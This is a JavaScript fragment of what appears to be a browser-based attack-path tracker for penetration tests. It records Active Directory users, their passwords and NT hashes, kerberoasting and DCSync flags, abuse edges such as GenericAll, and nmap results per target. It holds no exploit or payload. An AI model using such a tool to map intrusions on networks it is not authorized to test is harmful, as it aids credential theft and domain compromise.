    const bindBool = (id, field, hard=false) => document.getElementById(id)?.addEventListener("change", e => {
      u[field] = e.target.checked; save();
      if(hard) render(); else rebuildEdgesInline();
    });
    bindBool("gp-fda", "isDA", true);
    bindBool("gp-fea", "isEA", true);
    bindBool("gp-fkerb", "kerberoastable", true);
    bindBool("gp-fasrep", "asreproastable", true);
    bindBool("gp-fdcsync", "dcsync", true);
    bindBool("gp-flaps", "readLaps", true);
    document.querySelectorAll("[data-auth]").forEach(el => {
      el.addEventListener("change", () => {
        const tid = el.dataset.auth;
        if(el.checked){ if(!u.authTo.includes(tid)) u.authTo.push(tid); }
        else u.authTo = u.authTo.filter(x => x !== tid);
        save(); render();
      });
    });
    document.querySelectorAll("[data-admin]").forEach(el => {
      el.addEventListener("change", () => {
        const tid = el.dataset.admin;
        if(el.checked){ if(!u.adminOn.includes(tid)) u.adminOn.push(tid); }
        else u.adminOn = u.adminOn.filter(x => x !== tid);
        save(); render();
      });
    });
    document.querySelectorAll("[data-abuse-target]").forEach(el => {
      el.addEventListener("change", () => {
        const i = Number(el.dataset.abuseTarget);
        if(u.abuses[i]) u.abuses[i].target = el.value; save(); render();
      });
    });
    document.querySelectorAll("[data-abuse-type]").forEach(el => {
      el.addEventListener("change", () => {
        const i = Number(el.dataset.abuseType);
        if(u.abuses[i]) u.abuses[i].type = el.value; save(); render();
      });
    });
    document.querySelectorAll("[data-abuse-del]").forEach(el => {
      el.addEventListener("click", () => {
        const i = Number(el.dataset.abuseDel);
        u.abuses.splice(i, 1); save(); render();
      });
    });
    document.getElementById("gp-abuse-add")?.addEventListener("click", () => {
      const others = state.users.filter(x => x.id !== u.id);
      if(others.length === 0) return;
      u.abuses.push({ target: others[0].id, type: "GenericAll" });
      save(); render();
    });
    // Service access — add / remove
    document.getElementById("gp-access-add")?.addEventListener("click", () => {
      const sel = document.getElementById("gp-access-pick");
      if(!sel || !sel.value) return;
      const [target, service] = sel.value.split(":");
      if(!Array.isArray(u.access)) u.access = [];
      if(!u.access.some(a => a.target === target && a.service === service)){
        u.access.push({ target, service });
      }
      save(); render();
    });
    document.querySelectorAll("[data-gp-access-del]").forEach(el => {
      el.onclick = () => {
        const [target, service] = el.dataset.gpAccessDel.split(":");
        u.access = (u.access||[]).filter(a => !(a.target === target && a.service === service));
        save(); render();
      };
    });
    document.getElementById("gp-uremove")?.addEventListener("click", () => removeUser(u.id));
    return;
  }
}

/* ===========================================================================
   DIALOGS
   =========================================================================== */
function openAddTarget(){
  const modal = makeModal(`
    <h2>Add target</h2>
    <label>Name<input id="m-name" placeholder="DC01 (optional, auto-detected from nmap)"></label>
    <label>IP  <input id="m-ip"   placeholder="10.10.10.161"></label>
    <label>Nmap output (optional)<textarea id="m-nmap" placeholder="PORT   STATE SERVICE ..."></textarea></label>
    <div class="actions">
      <button data-close>Cancel</button>
      <button class="primary" id="m-ok">Add</button>
    </div>
  `);
  modal.querySelector("#m-ok").onclick = () => {
    addTarget({
      name: modal.querySelector("#m-name").value.trim(),
      ip:   modal.querySelector("#m-ip").value.trim(),
      nmap: modal.querySelector("#m-nmap").value,
    });
    modal.remove();
  };
}
async function pasteNmapToNewTarget(){
  let txt = "";
  try { txt = await navigator.clipboard.readText(); } catch(e){}
  if(!txt){ toast("clipboard empty","bad"); return openAddTarget(); }
  const parsed = parseNmap(txt);
  if(parsed.ports.length === 0){
    toast("no ports parsed from clipboard — open manual add","bad");
    return openAddTarget();
  }
  addTarget({ nmap: txt, ip: parsed.leaks.ip || "", name: parsed.leaks.hostname || "" });
  toast(`parsed ${parsed.ports.length} ports`);
}
function openAddUser(){
  const modal = makeModal(`
    <h2>Add user (AD principal)</h2>
    <label>Name<input id="u-name" placeholder="svc-alfresco"></label>
    <label>Domain<input id="u-dom" value="${esc(state.engagement.domain)}"></label>
    <label>Password (optional)<input id="u-pass"></label>
    <label>NT hash (optional)<input id="u-nt"></label>
    <div style="display:flex;gap:12px;margin:6px 0;font-size:11px;color:var(--fg-dim)">
      <label><input type="checkbox" id="u-da"> Domain Admin</label>
      <label><input type="checkbox" id="u-kerb"> kerberoastable</label>
      <label><input type="checkbox" id="u-asrep"> AS-REP roastable</label>
    </div>
    <div class="actions"><button data-close>Cancel</button><button class="primary" id="u-ok">Add</button></div>
  `);
  modal.querySelector("#u-ok").onclick = () => {
    addUser({
      name: modal.querySelector("#u-name").value.trim() || "user",
      domain: modal.querySelector("#u-dom").value.trim(),
      password: modal.querySelector("#u-pass").value,
      hashNT: modal.querySelector("#u-nt").value.trim(),
      isDA: modal.querySelector("#u-da").checked,
      kerberoastable: modal.querySelector("#u-kerb").checked,
      asreproastable: modal.querySelector("#u-asrep").checked,
    });
    modal.remove();
  };
}
function makeModal(innerHtml){
  const bg = document.createElement("div");
  bg.className = "modal-bg";
  bg.innerHTML = `<div class="modal">${innerHtml}</div>`;
  document.body.appendChild(bg);
  bg.addEventListener("click", e => { if(e.target === bg) bg.remove(); });
  bg.querySelectorAll("[data-close]").forEach(b => b.onclick = () => bg.remove());
  return bg;
}
function exportJson(){
  const blob = new Blob([JSON.stringify(state,null,2)], {type:"application/json"});
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = `pathfinder-${new Date().toISOString().slice(0,10)}.json`;
  a.click(); URL.revokeObjectURL(url);
}
function importJson(){
  const inp = document.createElement("input"); inp.type="file"; inp.accept=".json";
  inp.onchange = async () => {
    const f = inp.files[0]; if(!f) return;
    const text = await f.text();
    try {
      const imported = JSON.parse(text);
      state = migrate(imported);
      save(); render(); toast("state imported");
    } catch(e){ toast("bad JSON","bad"); }
  };
  inp.click();
}
function resetAll(){
  if(!confirm("Reset ALL state? Exports would be lost.")) return;
  localStorage.removeItem(STORAGE_KEY);
  state = loadState();
  render();
  toast("reset");
}
